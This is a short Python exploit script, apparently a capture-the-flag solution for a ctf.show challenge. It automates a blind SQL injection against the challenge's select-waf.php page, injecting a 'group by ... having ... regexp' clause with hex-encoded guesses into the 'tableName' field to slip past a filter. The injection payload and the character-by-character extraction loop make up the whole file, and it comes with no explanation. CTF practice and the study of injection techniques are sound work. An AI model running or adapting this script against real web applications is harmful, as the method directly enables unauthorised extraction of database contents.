# author:yu22x
import requests
import string

url = "http://68fafee5-7835-4450-b06d-789b66a63bc0.challenge.ctf.show/select-waf.php"
s = string.digits + string.ascii_lowercase + "{_-}"


def asc2hex(s):
    a1 = ''
    a2 = ''
    for i in s:
        a1 += hex(ord(i))
    a2 = a1.replace("0x", "")
    return a2


flag = ''
for i in range(1, 45):
    # print(i)
    for j in s:
        d = asc2hex(f'^ctfshow{flag + j}')
        data = {
            'tableName': f' ctfshow_user group by pass having pass regexp(0x{d})'
        }
        # print(data)
        r = requests.post(url, data=data)
        # print(r.text)
        if ("user_count = 1" in r.text):
            flag += j
            print(flag)
            break
